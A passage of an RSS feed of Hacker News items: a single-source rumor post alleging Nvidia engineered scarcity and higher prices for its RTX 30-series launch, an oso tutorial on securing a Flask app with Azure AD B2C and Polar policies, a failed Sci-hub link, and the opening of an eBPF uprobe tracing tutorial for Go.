<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.19.2"><div dir="ltr"><div><h2 id="viewer-ebfdg"><strong><u>Introduction – Let Them Eat Cake</u></strong></h2><div id="viewer-2bpaj"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play" data-pin-media="https://static.wixstatic.com/media/cd85b6_51a7a8cabef947ee8ce323812f17b2fd~mv2.png/v1/fit/w_503,h_282,al_c,q_80/file.png" src="https://static.wixstatic.com/media/cd85b6_51a7a8cabef947ee8ce323812f17b2fd~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-3agot"><em><strong>9/16/20 Update: As covered in a recent MLID video, I have been made aware of an ~$50 Rebate being provided to AIBs during September for each card sold. This expires in October.</strong></em></p><p id="viewer-3ijv9">I will start this post by getting straight to the point – I have evidence that suggests <strong>Nvidia is trying to have their cake and eat it too </strong>when it comes to the perceived price/performance of their new Ampere RTX 30-Series lineup. They are attempting to <strong>appear</strong> to be launching a lineup that is priced lower than their much maligned Turing generation, but in reality these things will cost<strong> far more </strong>than they are letting on for the overwhelming majority of shoppers this fall.</p><p id="viewer-aktp7">To be clear – <strong>most</strong> of my information comes from an industry veteran. This is a source who has<strong> never </strong>given me information that wasn’t eventually proven right, but it is still just one person who provided <strong>most</strong> of the information in this expose. I want to be honest about that with my readers from the start, but be rest assured that I did <strong>independently verify</strong> some of the details with other provenly reliable sources before this was published. I did dig into select details myself for verification, and every time I dug - nothing from the original source turned up false, and no red flags were raised. So, I am publishing this info, and making sure to do so before Ampere reviews go live. I believe <strong>this is information PC Gamers need to know as soon as possible</strong>.</p><h2 id="viewer-5pkbh"><strong><u>Nvidia’s Low Volume Loss Leaders</u></strong></h2><div id="viewer-6u1d0"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play" data-pin-media="https://static.wixstatic.com/media/cd85b6_f3194379ae844f0aaa35a0d02c902c3b~mv2.jpg/v1/fit/w_1221,h_774,al_c,q_80/file.png" src="https://static.wixstatic.com/media/cd85b6_f3194379ae844f0aaa35a0d02c902c3b~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-fueup">In June, <em>Igor’s Lab</em> ran a story alleging he had sources confirming the Founders Edition coolers cost more than $150 to manufacture. My source concurs with Igor, even going as far as to say that Igor’s number may be<strong> a lowball</strong> based on what this individual has been told. Additionally, AIBs have confirmed to my source that Nvidia forced them to provide BOM (Bill of Materials) cost-downs in order for their cooling designs to be approved for sale. This is far from a normal requirement for Nvidia, and in fact it gets weirder when you learn that supposedly most AIB BOM’s detailed margins below 40% if sold even close to MSRP. Some of you probably just connected the dots to what is going on here.</p><p id="viewer-ako0d">For those who don’t know - Nvidia usually likes margins above 60%, and Nvidia’s cooler definitely costs far more to manufacture than most GPU cooler designs that will be hitting the market on Ampere cards this fall. However, they don’t plan to actually sell many of those Founders cards…</p><p id="viewer-8vlo8">I now need to mention another of <em>Igor’s Lab’s</em> published findings. According to Igor, Samsung’s 8nm node is not having bad yields. In fact, the limited launch availability is due to a shortage of Founders Edition coolers. But the truth according to my main source is that <strong>there isn’t</strong> <strong>a shortage of coolers per se</strong>. If Nvidia wanted more of them, they could have had more of them – it’s <strong>scarcity by design.</strong></p><p id="viewer-er01m">Now let me spell out the real purpose of Nvidia’s extravagant Founders Edition: making sure reviewers have the best samples, with the best coolers, and at an <strong>alluring price</strong> most gamers won’t be able to obtain <strong>by design</strong>. They are accepting lower margins than usual on their FE cards with the knowledge that these published results will set unrealistic expectations for gamers. Unrealistic expectations that will stand the test of time in Day One Reviews that will be referenced for years…</p><p id="viewer-8io8c">But this story goes much further than simply “putting your best foot forward” with Day One Review Cards most people can’t buy. Both Founders and AIB cards will be in short supply in September, <strong>but AIB cards will stuff the channels by the end of October.</strong></p><p id="viewer-fa61a">Therefore, I think this is Nvidia’s <em>Ultimate Play: </em><strong>Intentionally </strong>causing an initial dearth of Ampere stock, allowing “supply and demand” to <strong>inflate the street price </strong>of Ampere when those beautiful $699 Founders cards <strong>instantly</strong> sell out, and then ultimately forcing AIBs to sell most of their models well above MSRP due to the required BOM Cost-Downs…that will be in ample supply once the street price is elevated.</p><h2 id="viewer-1b4gs"><strong><u>The Ultimate Play</u></strong></h2><div id="viewer-a3gi1"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play" data-pin-media="https://static.wixstatic.com/media/cd85b6_c73584cea2734af194348297df12dd12~mv2.png/v1/fit/w_1427,h_803,al_c,q_80/file.png" src="https://static.wixstatic.com/media/cd85b6_c73584cea2734af194348297df12dd12~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-fj4qs">Nvidia knows that RADEON will be more competitive this year than they have been for the past 5 years. This means they need to go hard with aggressive marketing and <strong>perceived</strong> price/performance than they have had to for quite some time. At the same time, Nvidia’s stock price is sitting at an all-time high, above $450 as of this writing. That is<strong> over double </strong>where it was just one year ago. If what this source alleges is true, Nvidia is seemingly attempting to <strong>keep margins elevated</strong> for another killer earnings season, and yet at the same time trying not to be perceived as the “bad guy” anymore. I will now completely lay out what I am saying, and provide the remaining details:</p><ol><li id="viewer-omb6"><p>Nvidia wants to keep their 50%+ <strong>average</strong> margins while pretending they are offering good value.</p></li><li id="viewer-caq6f"><p>They seek to accomplish this by selling incredible Founders Editions with low margins (at MSRP) from their website, but with painfully limited stock <strong>by design</strong>. </p></li><li id="viewer-e9m14"><p>Nvidia knows that if they get stellar Day One reviews <strong>praising</strong> Ampere for its performance <strong>and value</strong>, they will win back the hearts of gamers – which they lost with Turing – before RDNA 2 launches. Most people only read and remember the Day One reviews.</p></li><li id="viewer-9eudd"><p>There should be AIB models available day 1, but I am told <strong>only ~20% of the stock</strong> is required to be <strong>near</strong> MSRP, and likely in models with <strong>far inferior</strong> coolers to the FE design. Already a glance at some of the announced AIB cards <strong>shows</strong> that indeed, these are <strong>not</strong> going to be sold at MSRP: <a href="https://www.techspot.com/news/86681-aftermarket-rtx-3080-rtx-3090-card-prices-revealed.html" target="_blank" rel="noopener">https://www.techspot.com/news/86681-aftermarket-rtx-3080-rtx-3090-card-prices-revealed.html</a></p></li><li id="viewer-5tlea"><p>Additionally, Nvidia is allegedly causing supply of all Ampere models (<strong>including AIB</strong>) to be artificially limited during the first month of sales. Nvidia is supposedly doing so by controlling some key components AIBs need. I was able to <strong>independently verify</strong> this with an AIB who said “There will be low stock at launch, but <strong>it’s just propaganda</strong>.” </p></li><li id="viewer-6pj5b"><p>Ampere demand will outstrip the initial stock, and so the <strong>price will balloon </strong>by October.</p></li><li id="viewer-66ptu"><p>Eventually, this stock issue will suddenly disappear, much sooner than we have been led to believe with rumors about bad yields.</p></li><li id="viewer-5c742"><p>If all of this is true, Nvidia could state that the elevated prices <strong>aren’t</strong> their doing, and they could do so while pointing to a very limited number of cards that sell for MSRP every week. Likely models with the cheapest coolers.</p></li><li id="viewer-6nu4e"><p>The double memory versions of cards (RTX 3080 20GB, RTX 3070 16GB) should land roughly around when Nvidia stuffs the inventory in October. These will also come with<strong> a far higher price </strong>than the original models.</p></li><li id="viewer-3vnk2"><p>I can confirm that the double memory cards will <strong>not</strong> be sold from Nvidia’s website, and thus they will be able to <strong>claim </strong>AIBs are behind the price hike. These marked up cards are likely what Nvidia<strong> really </strong>wants you all to buy, and yet all those Day One reviews will say the 3080 is “Just $700.” <strong>Having your cake and eating it too.</strong></p></li><li id="viewer-eejt7"><p>Samsung’s 8nm node sounds<strong> much more </strong>able than previously reported by MLID. It doesn’t sound like there are “yield” problems on Samsung’s glorified 10nm node in 2020. At least not problems big enough to cause Ampere stock to be as low as it will be artificially at launch.</p></li></ol><p id="viewer-crqr8">I will be honest. The logical side of my brain has tortured me into admitting this plan is <strong>brilliant,</strong> if true. AMD may compete with Nvidia in price, performance, and especially efficiency this fall – but Nvidia is<strong> the master </strong>of winning mindshare and keeping margins high <strong>at the same time. </strong>In this writer’s eyes, the plan could absolutely allow Jensen to send golden samples, the best of the best, to reviewers, with a <strong>stunningly effective cooler</strong> that garners universal acclaim next to their aggressive (and mostly fake) MSRPs.</p><p id="viewer-c1534"><strong>This could go down in history as Jensen’s <em>Ultimate Play</em></strong>, and I am honestly not sure what we can do about it. But I do concur with my source that gamers deserved to know.</p><h2 id="viewer-7ug0v"><strong><u>Epilogue: A Word on Big Navi, and Some Advice for Gamers This Fall</u></strong></h2><div id="viewer-6o80q"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play" data-pin-media="https://static.wixstatic.com/media/cd85b6_b652a7e0f704478bba33c61b37de91ad~mv2.png/v1/fit/w_947,h_532,al_c,q_80/file.png" src="https://static.wixstatic.com/media/cd85b6_b652a7e0f704478bba33c61b37de91ad~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-80j5f">Finally, I would like to provide some updates – or more accurately <strong>adjustments</strong> - to what I expect from AMD’s (Always Massive Delays') “Big Navi.” I am confident that RADEON <strong>will</strong> release a Navi 21-derived card that is the following:</p><ul><li id="viewer-btai4"><p><strong><u>At least</u></strong> within spitting distance of the RTX 3080 in rasterization performance. If AMD doesn’t “beat” the 3080, they will assuredly <strong>crush</strong> the RTX 3070.</p></li><li id="viewer-5us83"><p>Substantially <strong>more efficient</strong> at originally intended clocks than Ampere, although they may <strong>push some models a bit</strong> to more directly compete with the 3080. Even when pushed, I do not expect these models to be power hogs.</p></li><li id="viewer-dgil8"><p>Potentially smaller than many people seem to expect, at least relative to Ampere. The specs I have just been made aware of are close to what I had <strong>incorrectly</strong> <strong>assumed</strong> must be Navi 22. This is made possible by incredible improvements to how RDNA <strong>manages memory and bandwidth</strong>. It should (for the first time since before GCN) make due with <strong>less bandwidth</strong> than Nvidia counterparts.</p></li><li id="viewer-7ukvn"><p>Provides Ray Tracing capabilities that overall <strong>exceed Turing</strong>, but likely <strong>underperform Ampere</strong>.</p></li><li id="viewer-e0m9m"><p><strong>No </strong>confirmation on what AMD’s answer to DLSS will be, but they<strong> are </strong>“taking it seriously.” The software stack is simply not confirmed yet.</p></li></ul><p id="viewer-1p0rt">AMD is <strong>unlikely to match</strong> Nvidia in die size, but it sounds like <strong>they won’t need to</strong> in order to have RADEON cards roughly competing (or maybe even exceeding) the 3080, while using <strong>far less energy</strong>. This in some ways will disappoint those that were <strong>unrealistically</strong> hoping “Navi 2X” is secretly “Navi 2.5X”, but it should come as good news for the majority of gamers that just want a <strong>decent $400-$600 card</strong> that doesn’t require a new power supply. I have stopped <strong>just short</strong> of saying the exact specs and performance I expect out of “Big Navi,” and that’s because I should be able to provide real &amp; tested performance numbers <strong>incredibly soon</strong>. So just stay tuned for more info from MLID on this.</p><p id="viewer-fbrpi">Some advice to leakers too – many of the widely accepted “Big Navi” CU &amp; Memory Bus estimates sound <strong>entirely incorrect </strong>to me at this point. Even …</p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play">https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play</a></em></p>]]>
            </description>
            <link>https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506521</guid>
            <pubDate>Thu, 17 Sep 2020 16:17:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adding Auth to a Flask App with Azure Active Directory and Oso]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24506252">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://www.osohq.com/post/oso-azure | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/oso-azure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Securing application resources usually consists of two security processes: authentication and authorization. <em>Authentication</em> determines the identity of a user, and is often accomplished by some kind of sign-in process. <em>Authorization</em> determines whether or not a user is allowed to access a resource, typically based on their authenticated identity but often based on other factors as well, like having a certain role, being in a group, having specific attributes or meeting other criteria relevant to the use case.</p>
<p>A common authentication pattern involves the application exchanging information with an <em>Identity Provider,</em> or "IdP", to confirm the identity of the user. Well-known IdPs include Facebook, Google, and GitHub.</p>
<p>This post will show how to add authentication and authorization to a simple Flask app, using Azure Active Directory B2C as an IdP, and oso's <code>oso-flask</code> library to authorize requests.</p>
<h3>Summary of what we'll cover:</h3>
<ul>
<li>Sign in users with Azure AD B2C</li>
<li>Use oso to restrict access to signed-in users</li>
<li>Add custom user attributes to our user profile</li>
<li>Write a policy to control access based on user attributes, like job title or team</li>
<li>Access Microsoft user data, like groups and managers, with the Graph API</li>
<li>Write an oso policy to implement role-based access control using Microsoft groups</li>
</ul>
<h3><strong>Background</strong></h3>
<p>This post uses an example application that's written in Python with Flask. You can find the source code <a href="https://github.com/osohq/oso-azure-ad-example">here</a>.</p>
<p><strong>Azure Active Directory</strong> ("AD") is Microsoft's cloud-based identity management service. We'll use it to sign in users and store user data. This example uses a newer variant of Active Directory called "<a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/overview">B2C</a>", which is designed for business-to-consumer apps to manage customer identities.</p>
<p><strong>oso</strong> is an open-source policy engine for authorization that is embedded in your application. We'll use oso to authorize user access to our application's resources. Since our example application uses Flask, we're using the <code>oso-flask</code> <a href="https://docs.osohq.com/using/frameworks/flask.html">integration</a>, which includes middleware for authorizing Flask requests.</p>
<p>The example we'll use in this post is a very simple application that stores and displays documents. Its authorization model is as follows:</p>
<ul>
<li>Users can always view documents that they are the owner of</li>
<li>Documents can belong to user groups</li>
<li>Public documents can be viewed by anyone</li>
<li>Private documents can only be viewed by users that belong to one of the document's groups</li>
</ul>
<h2>Authentication with Azure AD B2C</h2>
<p>We used a <a href="https://github.com/Azure-Samples/ms-identity-python-webapp">sample app</a> provided by Microsoft as the starting point for our example. Following Microsoft's <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-web-app-python?tabs=app-reg-ga">tutorial</a> on setting up authentication in their sample application will get you to the same starting point (you may have to complete a few prerequisite steps as well).</p>
<p>By the end of the tutorial, you should have <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-register-applications?tabs=app-reg-ga">registered the application</a> with your Azure AD <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-create-tenant">B2C tenant</a>. We've registered ours as "python-webapp":</p>
<p><img alt="Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled.png" src="https://images.osohq.com/oso-azure/Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled.png"></p>
<p>You should also have set up several <a href="https://docs.microsoft.com/en-us/azure/active-directory-b2c/tutorial-create-user-flows">User Flows</a> in the Azure portal for signing in, profile editing, and logging out:</p>
<p><img alt="Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%201.png" src="https://images.osohq.com/oso-azure/Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%201.png"></p>
<p>When you set up the user flows, make sure that you check the following boxes in "User Attributes" and "Application Claims":</p>
<ul>
<li>Email</li>
<li>Given name</li>
<li>Surname</li>
<li>Display Name</li>
<li>Job Title</li>
<li>Object ID (Application Claims only)</li>
</ul>
<p>Once you've reached the end of the tutorial, your app should be able to sign users in with an email and password, allow them to edit their profile, and log them out. Each of these user flows should return an <code>id_token</code> JWT to your app's redirect handler that stores the above attributes as claims. If you use Microsoft's provided JWT decoder, <a href="https://jwt.ms/">https://jwt.ms</a>, to test your user flow, you should see something like this:</p>
<p><img alt="Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%202.png" src="https://images.osohq.com/oso-azure/Adding%20auth%20to%20a%20Flask%20App%20with%20Azure%20Active%20Direc%20e4020384c5a348e499250ae95d24e0d1/Untitled%202.png"></p>
<p>Once you've completed the tutorial, the application can be run with the following command from the root directory:</p>
<pre><code>flask run --host localhost --port 5000
</code></pre>

<p>If you'd like to run our <a href="https://github.com/osohq/oso-azure-ad-example">sample application</a>, make sure to update the information in <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/app_config.py#L3-L17">app_config.py</a>:</p>
<pre><code># app_config.py

b2c_tenant = "your-tenant-name"
signupsignin_user_flow = "B2C_1_signupsignin1"
editprofile_user_flow = "B2C_1_profileediting1"
resetpassword_user_flow = "B2C_1_passwordreset1"
authority_template = (
    "https://{tenant}.b2clogin.com/{tenant}.onmicrosoft.com/{user_flow}"
)

CLIENT_ID = (
    "Enter_the_Application_Id_here"  # Application (client) ID of app registration
)

CLIENT_SECRET = (
    "Enter_the_Client_Secret_Here"  # Placeholder - for use ONLY during testing.
)
</code></pre>

<h3>Creating the User model</h3>
<p>Microsoft's sample app stores a raw dictionary of the <code>id_token</code> claims globally in <code>session["user"]</code>. In our app, we created a User <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/user.py#L13-L20">class</a> to store the user data, which we'll add to later on:</p>
<pre><code># user.py

class User:
    def __init__(self, id_token_claims):
        self.id = id_token_claims.get("oid")
        self.display_name = id_token_claims.get("name")
        self.first_name = id_token_claims.get("given_name")
        self.surname = id_token_claims.get("family_name")
        self.emails = id_token_claims.get("emails")
        self.job_title = id_token_claims.get("jobTitle")
</code></pre>

<p>In <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/app.py#L60-L61">our redirect handler</a>, we construct an instance of the current <code>User</code> from the <code>id_token_claims</code> dictionary, and store it on the <code>session</code> object:</p>
<pre><code># app.py

@app.route(app_config.REDIRECT_PATH)
def authorized():
    # ...
    user = User(id_token_result.get("id_token_claims"))
    session["user"] = user
</code></pre>

<p>We've successfully added authentication to our app. Now let's use oso to authorize our authenticated users' requests.</p>
<h2>Adding oso</h2>
<p>Since we're building a Flask app, we're going to use the <code>flask-oso</code> package to add oso to our application. <code>flask-oso</code> is an even lighter weight form of the <code>oso</code> package that provides convenient middleware for authorizing Flask requests. You can find a helpful guide to using <code>flask-oso</code> in our <a href="https://docs.osohq.com/using/frameworks/flask.html">docs</a>.</p>
<p>We followed three steps to add oso to the application:</p>
<ol>
<li>Create a <code>.polar</code> policy file</li>
<li>Initialize the global oso instance by loading the policy and registering relevant application classes</li>
<li>Add calls to <code>flask_oso.FlaskOso.authorize()</code> at authorization enforcement points</li>
</ol>
<h3>Writing a policy</h3>
<p>oso policies are written in a declarative policy language called Polar, and are stored in files with the <code>.polar</code> extension. Take a look at <a href="https://docs.osohq.com/getting-started/policies/index.html">Writing Policie</a>s for an overview of how to use oso policies.</p>
<p>The policy file in this example is called <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/authorization.polar#L1-L3">authorization.polar</a>. We started with a simple rule to allow any logged-in user to get a public document:</p>
<pre><code># authorization.polar

# allow anyone to get public documents
allow(_actor: User, "GET", doc: Document) if
    not doc.is_private;
</code></pre>

<p>This rule works by specializing the <code>_actor</code> on the <code>User</code> class, which means that only actors of type <code>User</code> are allowed to take any action on any resource. Since <code>get_current_user()</code>, which is used to get the default actor, returns <code>None</code> when the current user is not logged in, the rule only applies when the current user is authenticated. The <code>doc</code> argument is specialized on the <code>Document</code> class, which allows us to safely access the <code>is_private</code> field.</p>
<h3>Initializing oso</h3>
<p>We wrote a function called <code>init_oso()</code>, which we put in a file called <a href="https://github.com/osohq/oso-azure-ad-example/blob/master/oso_auth.py">oso_auth.py</a>:</p>
<pre><code># oso_auth.py

from oso import Oso
from flask_oso import FlaskOso

from document import Document
import user
from user import User

def init_oso(app):
    """ set up the `Oso` and `FlaskOso` objects, and add them to the global `app` instance."""
    oso = Oso()
    oso.register_class(Document)
    oso.register_class(User)
    oso.load_file("authorization.polar")

    flask_oso = FlaskOso(app=app, oso=oso)
    flask_oso.set_get_actor(user.get_current_user)

    app.oso = oso
    app.flask_oso = flask_oso
</code></pre>

<p>The <code>init_oso()</code> function creates an <code>Oso</code> instance, on which it registers the <code>User</code> class and the <code>Document</code> class that represents the app's document resources (registering Python classes with oso lets us reference them in our oso policies).</p>
<p>The function then uses the <code>Oso</code> instance to create the <code>FlaskOso</code> instance that we'll use to authorize requests. We call the <code>set_get_actor()</code> method to set the default actor to the current user. This default is used when we make calls to <code>flask_oso.authorize()</code> later on. The <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/user.py#L56-L57">method</a> we pass in, <code>get_current_user()</code> looks up the user on the session object:</p>
<pre><code># user.py

from flask import session

def get_current_user():
    return session.get("user")
</code></pre>

<h3>Authorizing requests</h3>
<p>We're now ready to use the oso library to authorize requests. In this example application, the resources we want to secure are documents, represented by the <code>Document</code> <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/document.py#L11-L46">class</a> in <code>document.py</code>:</p>
<pre><code># document.py

@dataclass
class Document:
    id: int
    owner_id: str
    groups: list
    is_private: bool
    content: str

def find_by_id(id):
    return DOCUMENTS.get(id)

DOCUMENTS = {
    1: Document(
        id=1,
        owner_id="5890e32a-c2ac-4aa0-902d-0717017d1bc3",
        groups=["engineering"],
        is_private=True,
        content="This is a private engineering doc.",
    ),
    2: Document(
        id=2,
        owner_id="273dd85f-0728-44c0-8588-c130f39c900b",
        groups=["marketing"],
        is_private=True,
        content="This is a private marketing doc.",
    ),
    3: Document(
        id=3,
        owner_id="273dd85f-0728-44c0-8588-c130f39c900b",
        groups=["admin"],
        is_private=False,
        content="This is a public admin doc.",
    ),
}
</code></pre>

<p>For this example we've simply hardcoded the document data, but this data would normally be stored in a database.</p>
<p><code>document.py</code> has a <a href="https://github.com/osohq/oso-azure-ad-example/blob/11aa2c113b7802b3136575e9900420511089834d/document.py#L55-L59">route</a> for viewing the documents, to which we've added a call to <code>flask_oso.FlaskOso.authorize()</code>:</p>
<pre><code># document.py

@bp.route("/docs/&lt;int:id&gt;", methods=["GET"])
def get_doc(id):
    doc = find_by_id(id)
    current_app.flask_oso.authorize(resource=doc)
    return str(doc)
</code></pre>

<p>The <code>authorize()</code> method accepts the same arguments as the <code>is_allowed()</code> method of the <code>oso</code> package (actor, action, and resource), but provides sensible defaults for working with Flask. With our call to <code>set_get_actor()</code>, we set the default actor to the current user. The action defaults to the method of the current request, <code>flask.request.method</code>. We have to provide the resource we want to authorize; in this case, we pass in the <code>Document</code> instance that is being …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.osohq.com/post/oso-azure">https://www.osohq.com/post/oso-azure</a></em></p>]]>
            </description>
            <link>https://www.osohq.com/post/oso-azure</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506252</guid>
            <pubDate>Thu, 17 Sep 2020 15:59:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thinking Clearly About Correlations and Causation (2018) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 10 (<a href="https://news.ycombinator.com/item?id=24506243">thread link</a>) | @Anon84
<br/>
September 17, 2020 | https://dacemirror.sci-hub.tw/journal-article/7fe084d6885f9339910bf080b718c012/rohrer2018.pdf?download=true | <a href="https://web.archive.org/web/*/https://dacemirror.sci-hub.tw/journal-article/7fe084d6885f9339910bf080b718c012/rohrer2018.pdf?download=true">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dacemirror.sci-hub.tw/journal-article/7fe084d6885f9339910bf080b718c012/rohrer2018.pdf?download=true</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506243</guid>
            <pubDate>Thu, 17 Sep 2020 15:58:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Live debug Go in prod using eBPF]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24505862">thread link</a>) | @imukherjee
<br/>
September 17, 2020 | https://blog.pixielabs.ai/blog/ebpf-function-tracing/post/ | <a href="https://web.archive.org/web/*/https://blog.pixielabs.ai/blog/ebpf-function-tracing/post/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>This is the first in a series of posts describing how we can debug applications in production using eBPF, without recompilation/redeployment. This post describes how to use <a href="https://github.com/iovisor/gobpf" target="_blank" rel="noopener noreferrer">gobpf</a> and uprobes to build a function argument tracer for Go applications. This technique is also extendable to other compiled languages such as C++, Rust, etc. The next sets of posts in this series will discuss using eBPF for tracing HTTP/gRPC data, SSL, etc.</p><p>When debugging, we are typically interested in capturing the state of a program. This allows us to examine what the application is doing and determine where the bug is located in our code. A simple way to observe state is to use a debugger to capture function arguments. For Go applications, we often use Delve or gdb.</p><p>Delve and gdb work well for debugging in a development environment, but they are not often used in production. The features that make these debuggers powerful can also make them undesirable to use in production systems. Debuggers can cause significant interruption to the program and even allow mutation of state which might lead to unexpected failures of production software.</p><p>To more cleanly capture function arguments, we will explore using enhanced BPF (<a href="https://ebpf.io/" target="_blank" rel="noopener noreferrer">eBPF</a>), which is available in Linux 4.x+, and the higher level Go library <a href="https://github.com/iovisor/gobpf" target="_blank" rel="noopener noreferrer">gobpf</a>.</p><p>Extended BPF (eBPF) is a kernel technology that is available in Linux 4.x+. You can think of it as a lightweight sandboxed VM that runs inside of the Linux kernel and can provide verified access to kernel memory.</p><p>As shown in the overview below, eBPF allows the kernel to run BPF bytecode. While the front-end language used can vary, it is often a restricted subset of C. Typically the C code is first compiled to the BPF bytecode using Clang, then the bytecode is verified to make sure it's safe to execute. These strict verifications guarantee that the machine code will not intentionally or accidentally compromise the Linux kernel, and that the BPF probe will execute in a bounded number of instructions every time it is triggered. These guarantees enable eBPF to be used in performance-critical workloads like packet filtering, networking monitoring, etc.</p><p>Functionally, eBPF allows you to run restricted C code upon some event (eg. timer, network event or a function call). When triggered on a function call we call these functions probes and they can be used to either run on a function call within the kernel (kprobes), or a function call in a userspace program (uprobes). This post focuses on using uprobes to allow dynamic tracing of function arguments.</p><p>Uprobes allow you to intercept a userspace program by inserting a debug trap instruction (<code>int3</code> on an x86) that triggers a soft-interrupt . This is also <a href="https://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints" target="_blank" rel="noopener noreferrer">how debuggers work</a>. The flow for an uprobe is essentially the same as any other BPF program and is summarized in the diagram below. The compiled and verified BPF program is executed as part of a uprobe, and the results can be written into a buffer.</p><div><figure>
    <span>
      <span></span>
  <p><img alt="BPF for tracing (from Brendan Gregg)" title="BPF for tracing (from Brendan Gregg)" src="https://blog.pixielabs.ai/static/a11d6d9cb78e055d59136a97665907d3/073a0/bpf-tracing.jpg" srcset="https://blog.pixielabs.ai/static/a11d6d9cb78e055d59136a97665907d3/8356d/bpf-tracing.jpg 259w,https://blog.pixielabs.ai/static/a11d6d9cb78e055d59136a97665907d3/bc760/bpf-tracing.jpg 518w,https://blog.pixielabs.ai/static/a11d6d9cb78e055d59136a97665907d3/073a0/bpf-tracing.jpg 610w" sizes="(max-width: 610px) 100vw, 610px" loading="lazy"></p>
    </span>
    <figcaption>BPF for tracing (from Brendan Gregg)</figcaption>
  </figure></div><p>Let's see how uprobes actually function. To deploy uprobes and capture function arguments, we will be using <a href="https://github.com/pixie-labs/pixie/blob/main/demos/simple-gotracing/app.go" target="_blank" rel="noopener noreferrer">this</a> simple demo application. The relevant parts of this Go program are shown below.</p><p><code>main()</code> is a simple HTTP server that exposes a single <em>GET</em> endpoint on <em>/e</em>, which computes Euler's number (<strong>e</strong>) using an iterative approximation. <code>computeE</code> takes in a single query param(<em>iters</em>), which specifies the number of iterations to run for the approximation. The more iterations, the more accurate the approximation, at the cost of compute cycles. It's not essential to understand the math behind the function. We are just interested in tracing the arguments of any invocation of <code>computeE</code>.</p><pre><div><p><img 